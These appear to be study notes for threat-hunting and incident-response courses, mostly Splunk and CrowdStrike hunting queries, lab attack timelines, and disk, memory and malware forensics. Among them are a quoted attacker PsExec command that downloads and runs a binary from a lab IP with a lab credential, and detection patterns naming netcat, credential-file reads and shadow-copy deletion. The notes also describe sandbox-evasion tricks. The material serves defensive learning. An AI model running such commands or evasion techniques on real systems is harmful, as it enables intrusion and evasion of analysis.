# TH-200

## Hunting With Network Data

Searches through all indexed data, specifically looking for events originating from a specific hostname > identifies the top 20 destination IP addresses associated with them.

`index="*" SourceHostname="CLIENT2.megacorpone.com"| top limit=20 DestinationIp`

Generate a table that maps our malicious IP against the running process on CLIENT02:

`index="*" DestinationIp="192.229.211.108"  User="MEGACORPONE\\e.taylor" | table _time,Image,ProcessId`

Filter network events related to a domain user and being sent to TCP port 80

`index="*" DestinationPort=80 User="MEGACORPONE\\e.taylor"`

## WireShark

`ip.addr == 192.229.211.108 and ip.addr ==  10.25.25.101`

Various malware and ransomware usually perform local network scanning and enumeration before deciding what actions to take. The initial local network scan is often performed through Address Resolution Protocol (ARP) before conducting extra enumeration.

Filter any ARP traffic originated by CLIENT02 + include SMB traffic

`(arp.src.proto_ipv4 == 10.25.25.101) or smb`

## Hunting on Endpoints

Display all events that contain strings consisting the the `.nmh` file extension.

`index="*" "*.nmh"`

`index="*" "akira" NOT "akira_readme.txt"`

File creation events with a Sysmon ID 11 (FileCreate) records both file creations and overwrites.

Depending on how the ransomware performs the file encryption process, Sysmon might not generate a new FileCreate event when a `.nmh` file is created. For instance, if the ransomware replaces the file contents (or only parts of it) and renames it to the `.nmh` file extension, no event is generated as this is not a file creation or an "overwrite" that would cause Sysmon to generate a FileCreate event. To capture such ransomware activities, we'd need to supplement our monitoring process with additional solutions or audit policies.

Search all indices for occurrences of the file hash 

`index="*" "637E28B38086FF9EFD1606805FF57AAF6CDEC4537378F019D6070A5EFDC9C983"`

Hunt for occurrences of these names

`index="*" ("l9k1JEYlHZ.exe" OR "image_slider.exe" OR "db_update.exe")`

Hunt for the C&C IP address,

`index="*" 192.168.50.63`

`index="*" host="CLIENT4" "192.168.50.63" | reverse`

`host="CLIENT4" (index="windows_powershell") OR (index="windows_sysmon" FileCreate) OR (index="windows_sysmon" ProcessCreate)`

`index="*" "healthcheck.exe"`

`index="*" host="CLIENT4" "Invoke-Bloodhound"`

The Windows Security log records account logons under event 4624. This is generated when a logon session is created on the local or destination machine and contains a variety of information such as the account that was used to authenticate, the source IP for network logons, and the logon type.

In Windows security, particularly for event ID 4624, "logon" and "login" are often used interchangeably to describe user authentication to a system. However, "login" is a broader term for accessing systems or services, while "logon" specifically refers to starting a user session in the Windows environment.

Search for 4624 events in the Windows Security log. Specifically exclude events originating from the domain controller DC1 due to its role as a central authentication point. => Focus on RDP logins to domain computers.

While we exclude DC1 from this search, we should confirm later that the threat actor did not perform lateral movement activities to or from the domain controller.

`index="*" sourcetype="WinEventLog:Security" EventCode=4624 "h.johnson" NOT host="DC1"`

The logon type for the first event is 3 (Network) and the other 2 events have the logon type 10 (RemoteInteractive). This is typical for scenarios in which a user initiates an RDP connection to a Windows machine, where first, the network credentials are validated (type 3), followed by the establishment of a remote interactive session (type 10).

```
Timeline:
8:05:03 PM - Execution of l9k1JEYlHZ.exe on CLIENT3
8:04.59 PM - Download l9k1JEYlHZ.exe from 192.168.50.63 on CLIENT3
7:55:14 PM - File image_slider.exe deleted on CLIENT5
7:01:25 PM - File Transfer of the BloodHound Archive using scp to 192.168.50.63
6:57:58 PM - Execution of Invoke-BloodHound on CLIENT4
6:56:50 PM - Download of SharpHound PowerShell Collector from 192.168.50.63 on CLIENT4
6:55:14 PM - Execution of healthcheck.exe (Mimikatz) on CLIENT4
6:51:50 PM to 6:51:58 PM - Using Microsoft Edge to browse web server on 192.168.50.63

Threat Actor's Tools:
637E28B38086FF9EFD1606805FF57AAF6CDEC4537378F019D6070A5EFDC9C983 - db_update.exe (DB1), image_slider.exe (CLIENT5) and l9k1JEYlHZ.exe (CLIENT3)
3c92bfc71004340ebc00146ced294bc94f49f6a5e212016ac05e7d10fcb3312c - l9k1JEYlHZ.exe (FILE1)

Network IoCs:
192.168.50.63 
```

## Threat Hunting Without IoCs

Displays all registered scheduled tasks and groups them by their aid (Agent Identifier). To show the human-readable DNS name of the machine instead of the identifier, let's replace aid with ComputerName:

Explore activities related to scheduled tasks, such as modifications and deletions, According to the documentation, the CQL also includes other simpleNames such as ScheduledTaskDeleted or ScheduledTaskModified.

```
#event_simpleName=ScheduledTask*
| groupBy([ComputerName, TaskName, TaskExecCommand, TaskAuthor], limit=max)
```

```
#event_simpleName=ScheduledTask*
| TaskExecCommand = "C:\\Users\\e.taylor\\fin/6.exe"
```

Uncover all events associated with the filenames `6.exe` and `432.lnk`, excluding any occurrences from CLIENT2.

```
#event_simpleName=ProcessRollup2 OR #event_simpleName=SyntheticProcessRollup2
| ComputerName != CLIENT2
| CommandLine = /6.exe/i OR CommandLine = /432.lnk/i
```

Search for network communications to `webdav.4shared.com` and `cohodl.com` (from the identified username).

```
("webdav.4shared.com") or ("cohodl.com")
```

Search for any instances of scheduled tasks with the names WindowsUpdate or UpdateHealthCheck across all systems, excluding CLIENT2.

```
#event_simpleName=ScheduledTask*
| ComputerName != CLIENT2
| TaskName = WindowsUpdate OR TaskName = UpdateHealthCheck
```

Hunt for events containing the username or password that were used in the authentication to the WebDAV share.

```
("lasex69621@cohodl.com") or ("dE}9tBDaFK'Y%uv")
```

# IR-200

## Incident Detection and Identification

Compute the hash for `C:\update.exe`

`Get-FileHash C:\update.exe -Algorithm SHA256`

Detect password spraying attacks

`host="dc01" "EventCode=4625"`

Check if the password spraying attempt was successful and valid credentials were identified, search for successful authentication requests with the event ID **4624**. 

**Script Block Logging** records the input and output of script blocks executed in PowerShell. **Script Block Logging** events are collected in the index **windows_powershell**.

Search for events related to password spraying => Commands or tools used to perform the attack if those actions were performed via PowerShell. 

`index="windows_powershell" host="CLIENT01"`

Well-known password spraying PowerShell script: `https://github.com/dafthack/DomainPasswordSpray`

Reviewing the other events, discover an event with the ID **4100** with the user is ...

Search the **Windows Defender Operational** log and the event ID 1116 which is used to record the detection of malware:

`index="windows_defender" "EventCode=1116"`

Understand how the malicious binaries were transferred to the internal machines:

`index="windows_sysmon" host="CLIENT01"`

Since the scheduled task was identified by analyzing the PowerShell history, search the PowerShell Operational log that contains events recorded by **Script Block Logging**.

3 commands that can be used in PowerShell to create a scheduled task: `Register-ScheduledTask` Cmdlet, `schtasks.exe`, and `at.exe`.

`index="windows_powershell" host="CLIENT01" ("Register-ScheduledTask" OR "schtasks.exe" OR "at.exe")`

The post contained the filename `dump.db`. Since the database was dumped from a Confluence service, limit the potentially-infected systems to WEB01.

Search for all events containing the string `*.db` for the host WEB01. If the database is exfiltrated without renaming, it should have this file extension.

`host="web01" "*.db"`

Search query for the **ShellShock** alert. On host WEB01, the `other_vhosts_access.log` file is searched for log entries related to access requests that contain references to any files with the `.cgi` extension.

`host="web01" source="/var/log/apache2/other_vhosts_access.log" "*.cgi"`

Search the index **windows_sysmon** for events containing the string Bloodhound on the host FILE01.

`index="windows_sysmon" host="FILE01" "BloodHound"`

`:Zone.Identifier` at the end of the file name is metadata and used by the **Attachment Execution Service** in Windows, indicating where the file originated from. The main objective is to protect users from running malicious files downloaded from locations such as the internet.

Find out who or in which user context the domain enumeration was performed.

Search the **windows_powershell** index to find PowerShell commands or script blocks related to the SharpHound collector usage.

`index="windows_powershell" host="FILE01"`

The event contains the information that runas was used to create a PowerShell session as domain user X. This explains why the local administrator account was recorded performing the domain enumeration:

`runas /netonly /user:TECH\l.martin "powershell.exe -ep bypass"`

Windows Defender Quarantine

`index="windows_defender" "EventCode=1160"`

Search for SQLi

`index=websrv_logs "SELECT" AND ("UNION ALL" OR "1=1" OR "--" OR "/*")`

Search for Deserialization exploits because Confluence is developed in Java.

For code injection payloads, use `*bash*, *sh*, *nc*, and *netcat*`, as these programs are typically involved to execute commands in web-based exploits. 

For directory traversal attacks, use `id_*` to search for the extraction of SSH private keys, and `/etc/*` for configuration files such as `/etc/passwd`.

Web-based exploits have several formatting limitations, such as whitespaces and other special characters.

To use commands such as bash -c "whoami", attackers commonly URL encode them. E.g., `bash%20-c%20%22whoami%22`.

`host="web01" source="/var/log/apache2/other_vhosts_access.log" ("*bash%20*" OR "*sh%20*" OR "*nc%20*" OR "*netcat%20*" OR "id_*" OR "/etc/*")`

The attacker downloaded the PowerShell script `DomainPasswordSpray.ps1` from the IP address `X`.

`index="windows_powershell" host="CLIENT01" "192.168.48.130"`

`index="windows_powershell" host="CLIENT01" "Rubeus"`

PsExec is used to move laterally to FILE01.

```pwsh
.\PsExec64.exe -accepteula -i \\FILE01 -u TECH\SVCFILE01 -p "Querty09!" cmd /c powershell -Command "& {$client = New-Object System.Net.WebClient; $client.DownloadFile('http://192.168.48.130/application_builder.exe', 'C:\Windows\Tasks\updater.exe'); Start-Process 'C:\Windows\Tasks\updater.exe'}"
```

Windows Security log contains audit events. They are contained in the index **main**,

`index="main" host="FILE01"`

Key activities list:

- 8:05:07.000 AM Thunderbird creates application.iso on the Desktop of a.jones
- 8:06:44.000 AM Binary application_builder.exe (Contained in ISO container) created on the Desktop of a.jones
- 8:06:50.000 AM Binary application_builder.exe is executed by a.jones
- 8:07:43.000 AM Scheduled Task "Updater" was created
- 8:08:26.000 AM Domain Enumeration with PowerView
- 8:09:04.000 AM Password Spraying with Invoke-PasswordSpray Script
- 8:09:17.000 AM Kerberoasting attack with Rubeus
- 8:11:17.000 AM Lateral Movement with PsExec to FILE01
- 8:15:36.000 AM File Access of employee_records.xlsx on FILE01

## Digital Forensics for Incident Responders

Using Kali Linux live in Forensics Mode to obtain a disk image from a victim machine and obtained a hash of the resulting image for integrity monitoring.

```bash
sudo fdisk -l
sudo mkdir /mnt/external
sudo mount /dev/sda1 /mnt/external  
ls -lsa /mnt/external
sudo dd if=/dev/nvme0n1 of=/mnt/external/VICTIM-OS.raw bs=4M conv=sync,noerror status=progress
sha256sum /mnt/external/VICTIM-OS.raw
```

### Computer Forensics (Autopsy)

Perform analysis on disk images through ingest modules:

- The **Discovery** feature is designed to quickly identify potential findings and interesting data that may not immediately apparent.

- Use the ((timeline)) feature to better understand sequences of events as Autopsy aggregates a broad spectrum of activity based on timestamps. We can build timelines around particular points of interest such as file creation and review the events before and after an event.

Use the timeline feature to review events around the creation of `dump.db`.

Right-click the file and select **View File in Timeline....** For now, we are interested in **5 minutes before and after the file creation**. To view this, we'll select **File Created** and then Show Timeline.

### Memory Forensics (Volatility)

`windows.info` plugin provides general information about the Windows system the memory dump was created on.

`python vol.py -f E:\memdump.mem windows.info`

**NetStat** plugin displays all network connections at the time the memory dump was created. This is often a great way of determining malicious activities such as command and control communication.

`python vol.py -f E:\memdump.mem windows.netstat.NetStat`

Use **PsTree** plugin to view a tree view of running processes which represents the parent-child relationships of the machine's processes. This can reveal unusual relationships, orphaned processes, unknown processes, and anomalies in process behavior.

`python vol.py -f E:\memdump.mem windows.pstree.PsTree`

Typically, we should always further investigate binaries spawning `cmd.exe` and `powershell.exe` as attackers use these processes to spawn interactive shells.

`windows.cmdline.CmdLine` plugin

`python vol.py -f E:\memdump.mem windows.cmdline.CmdLine`

### Network Forensics (RSA NetWitness Investigator - NwInvestigator)

On the left menu, we'll right-click and select `New Local Connection`.

Once the collection is created, right-click on it and select `Connect`. Once the status is Ready, we can right-click on the collection and select `Import Packets`.

The pcap files from the Suricata system are located on the Desktop in the PCAP directory. Due to their naming, we have to select `All Files (*.*)` then we'll select all of the captures and click `Open`.

The first step is to right-click on the collection and select `Navigate Collection`. This will open the collection and its data in a new tab. The values are grouped into categories such as E-mail Address, Attachment, Directory, Extension, and much more.

### Log Forensics

Sysmon, Audit Policies, and PowerShell Logging mechanisms such as PowerShell Script Block Logging can record a broad variety of activities. The Linux-based Auditd is a powerful tool for monitoring system activities such as system calls, file accesses, and network events.

search for all events that contain a filename with the extension .pdf in all available indices

`index="*" "*.pdf"`

## Malware Analysis

### Basic Static Analysis (PEStudio)

The SHA256 hash representation of the file and the **entropy**.

High entropy levels in a file can indicate encryption, obfuscation, compression or packing, which are common characteristics of software specifically designed to evade basic analysis methods.

PowerShell Script to calculate Shannon's Entropy for all `.exe` files in a specified directory

```pwsh
function Get-FileEntropy {
    param ([string]$FilePath)

    $bytes = [System.IO.File]::ReadAllBytes($FilePath)
    $freq = @{}
    $bytes | ForEach-Object { $freq[$_] = $freq[$_]+1 }
    $entropy = 0
    $freq.Values | ForEach-Object {
        $p = $_ / $bytes.Length
        $entropy -= $p * [Math]::Log($p, 2)
    }
    $entropy
}

$dir = "C:\Tools\"
Get-ChildItem -Path $dir -Filter "*.exe" | ForEach-Object {
    Write-Host "$($_.Name) entropy: $(Get-FileEntropy $_.FullName)"
}
```

VirusTotal

A command line alternative to obtain the entropy and various hash representations of a binary is **SigCheck**. It also displays various other file data such as versioning information.

PEStudio flagged **VirtualAlloc** a Win32 API function, grouped it as an import, and mapped it to the process injection technique of the MITRE ATT&CK framework.

The locations of the string are .aiox, which is a non-standard PE section, and .rdata, which is a section commonly used for read-only data.

The .text section contains the PAYLOAD: string. This section contains the binary's executable code and this indicates that some kind of payload may be stored there. The strings below PAYLOAD: are stored in the .aiox section and seem to consist of alphanumeric sequences which could potentially be part of an obfuscated payload.

In PEStudio, click on `strings` in the left menu to display all identified strings and additional information about the strings such as the size and section they are located in.

The Windows strings program, a part of the Sysinternals Suite can also display a binary's strings. The identically-named, but different strings tool can perform a similar function on Linux-based systems.

Review the `indicators` menu in PEStudio. They include strings, digital signatures, packers, obfuscation techniques and more.

PEStudio categorizes indicators on a scale from level 1 to 3, where level 1 signifies a highly suspicious malicious indicator. Levels 2 and 3 denote progressively lower levels of suspicion, with level 3 being the least indicative of malicious intent.

The level 1 indicators primarily focus on the non-standard `.aiox` section.

The analysis reveals that 2 sections, including the normally executable `.text`, are marked as executable. However, the `.aiox` section is uniquely flagged as **self-modifying**.

Self-modifying implies the ability to alter permissions, enabling sections that were initially marked as non-executable to execute code. This term can also refer to the runtime deobfuscation of a payload, a process that makes the payload executable only at the moment of its execution.

### Basic Dynamic Analysis (ProcMon - Procmon64.exe)

Each event in ProcMon is highly detailed, showing the operation type, e.g. 'ReadFile' or 'WriteFile', along with the specific path or Registry key being accessed.

It also displays the result of each operation, indicating whether it was successful or unsuccessful (having encountered errors or warnings such as 'ACCESS DENIED').

**Process information**: the process name, the unique Process Identifier (PID), the session ID, and the user account under which each process is running.

ProcMon also reports on various performance data such as CPU and memory usage, which can help us diagnose performance issues.

It even monitors network operations.

filter `Process Name` contains `example.exe` then Include.

Then start a PowerShell window and execute `example.exe`

Look for unusual or unexpected activity, such as frequent access to unusual registry keys, repetitive read/write operations to a particular file, or network activity from a process that shouldn't be communicating over the network.

Focus on the **Load Image** and network-related operations, which provide insight into which libraries are loaded by the binary and which network connections are opened, respectively.

The Load Image operation refers to an event that is logged when a process loads an executable image into its address space. This can include loading a DLL (Dynamic Link Library), an EXE (executable file), or any other binary files that contain executable code.

The "Load Image" event is crucial for understanding which executables and libraries a process is utilizing. In an analysis context, this can help identify potentially malicious code being injected or loaded into a process.

A Load Image event typically displays the path to the image that was loaded, which can help us verify the source and legitimacy of the loaded executable component.

It also loads kernel32.dll, a core Windows library that provides access to essential system functions such as file operations, memory management, and process/thread creation.

Note that kernel32.dll is a standard Windows component used by legitimate software. We would need to determine the context of how kernel32.dll is being loaded and used, such as the sequence of function calls and the nature of the invoking processes.

Malware authors can use several features of kernel32.dll for malicious purposes. For example, kernel32.dll functions can be used to manipulate files, inject code into other processes, create new system processes, hide the presence of the malware and make it appear legitimate, alter system configurations, create registry entries, modify startup programs to ensure it remains active after system reboots and even gain higher privileges on the system in order to execute a privilege escalation attack.

The next DLL that is loaded is `ws2_32.dll` which is responsible for providing network connection functions.

Binaries loading this library are capable of network communication. Although ws2_32.dll is often used legitimately, malware can use it to accept attacker connections, communicate with C&C infrastructure, exfiltrate data, receive commands, and scan the network for other vulnerable machines or services that can be exploited or compromised.

We find several **TCP Reconnect** operations. Binary attempts network connections to 192.168.48.130.

In addition, the connection attempts are made to target's HTTPS port (443) which attackers generally leverage in order to blend in with regular browser traffic in an attempt to evade monitoring and detection solutions.
Soon after these reconnection attempts, the program terminates itself.

The binary loaded kernel32.dll as well as networking DLLs such as ws2_32.dll. Then, it attempted to create network connections to 192.168.48.130 on the HTTPS port. After several failed reconnects, the program terminated itself.

Filter and display specific types of events. E.g., configure it to display only Network Activity or Process and Thread Activity.

ProcMon captures a wide array of activities, including file system, Registry, and process/thread operations. However, it lacks the capability to monitor in-memory activities. While ProcMon can track the creation of processes used for such injections, it is unable to detect in-memory activities like the unpacking or decrypting of payloads.

ProcMon also has limited insight into network activity. While it can log basic network events, it is not designed to provide detailed network traffic analysis. We could not use ProcMon to decypher encrypted network communication, which is common in modern malware to conceal command and control (C2) traffic or data exfiltration.

### Automated Analysis

VirusTotal

While the entropy is a measure for randomness, we can use the **Chi2** (or Chi-squared) value to determine how well the byte frequency distribution of a section of data matches a predicted distribution, such as what you would expect to find in a benign file.

I.e., It helps determine if the observed byte occurrences within the file deviate significantly from the norm. A high Chi-squared value can indicate that the data within a file is not typical of what a non-malicious file would contain. This can also be a red flag for potential malware, as it may suggest the presence of packed or obfuscated code.

VirusTotal shows `Highlighted actions` at the bottom of the page. The information in this section is considered suspicious and is highlighted.

The function call **GetTickCount** is shown under Calls Highlighted.

The GetTickCount Windows API function returns the number of milliseconds that the system has been running. 

Malware authors can use this function to evade detection.

E.g., the Upatre family of malware uses GetTickCount to check how long a system has been running. This simple check helps the malware infer whether or not it is running in a sandbox environment.

- Most virtual, sandboxed analysis systems are started when needed and then shut down to conserve resources.
- Most real-world systems are rarely restarted.

Upatre malware takes advantage of this by calling GetTickCount and comparing the returned value to 0xAFE74 (720,500 milliseconds, or about 12 minutes). If GetTickCount returned a value less than this, Upatre infers that the system has been running for less than twelve minutes and exits. The binary would then appear benign since the malicious code never executed.

=> Some advanced sandbox systems modify the value returned by GetTickCount to simulate a longer running system, thereby tricking the malware into continuing its execution.

malware authors leverage a variety of **sleep** functions to pause its execution for a set period. If this period exceeds the typical analysis time of a sandbox or automated security system, the malware's malicious activities might not be executed or observed during the analysis window. Sandboxes limit the time period spent on a sample, and if the malware remains dormant during this period, the malware will likely be classified as benign.

An interesting variant of this technique involves **threading based sleep evasion**. The malware creates a thread that continuously increases a counter, and the main malware process sleeps for a significant period. The length of the sleep in the main process is calculated based on the counter increment in the thread. If a sandbox modifies the sleep duration to shorten the analysis time, it can disrupt the malware's flow, causing it to crash or behave unexpectedly. This manipulation takes advantage of the sandbox's attempt to shorten sleep periods for faster analysis.

**API Hammering** involves making a large number of redundant API calls to effectively delay the execution. The malware performs numerous unnecessary operations to waste time.

The `Decoded Text` identifies a Metasploit Connect string including an IP address and port number.

VirusTotal has introduced **Code Insight**, which leverages artificial intelligence to analyze code within files. This feature can produce natural language summaries of code snippets, providing us with deeper insights into the purpose of the analyzed code. Code Insight does a particularly good job of transforming code into natural language explanations. Currently, this works with PowerShell files, with plans to expand to additional file formats.

Download Commands

`index="*" ("Invoke-WebRequest" OR "Invoke-RestMethod" OR "(New-Object System.Net.WebClient).DownloadFile" OR "IEX" OR "bitsadmin /transfer")`

Malicious Apps

`index="*" ("BloodHound" OR "SharpHound" OR "Mimikatz" OR "NetExec" OR "CrackMapExec" OR "PowerView" OR "Rubeus" OR "Bitcoin" OR "Monero" OR "Ethereum" OR "Torrent" OR "winPEAS")`

Script Execution

`index="*" ("*.vbs" OR "*.ps1" OR "*.bat")`

Shadowcopy Commands

`index="*" ("vssadmin delete shadows" OR "wmic shadowcopy delete" OR "shadowcopy" OR "Win32_ShadowCopy" OR "vssadmin")`

Sysadmin Commands

`index="*" ("net share" OR "net use" OR "net view" OR "powershell -Command" OR "powershell -EncodedCommand" OR "wmic process" OR "rundll32" OR "bcdedit" OR "ipconfig" OR "ping" OR "net localgroup" OR "whoami")`



